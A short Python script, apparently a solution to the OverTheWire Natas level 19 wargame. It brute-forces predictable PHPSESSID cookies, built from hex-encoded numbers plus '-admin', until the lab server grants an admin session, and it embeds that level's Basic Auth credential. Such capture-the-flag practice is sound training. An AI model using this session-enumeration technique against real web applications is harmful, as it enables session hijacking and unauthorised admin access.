import requests , string
from requests.auth import HTTPBasicAuth 
  
headers = {'content-type': 'application/x-www-form-urlencoded','Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw=='}  

  
for i in range(1000):
    print("Testing {0}".format(i))
    d = str(i)
    value='' 
    for j in range(len(d)):
        value += '3'+d[j]
    response = requests.post('http://natas19.natas.labs.overthewire.org/index.php', headers=headers, cookies={"PHPSESSID": value+"2d61646d696e"})
    if "You are an admin." in response.text:
        print("blipblopblip: " + str(d))
        break
        

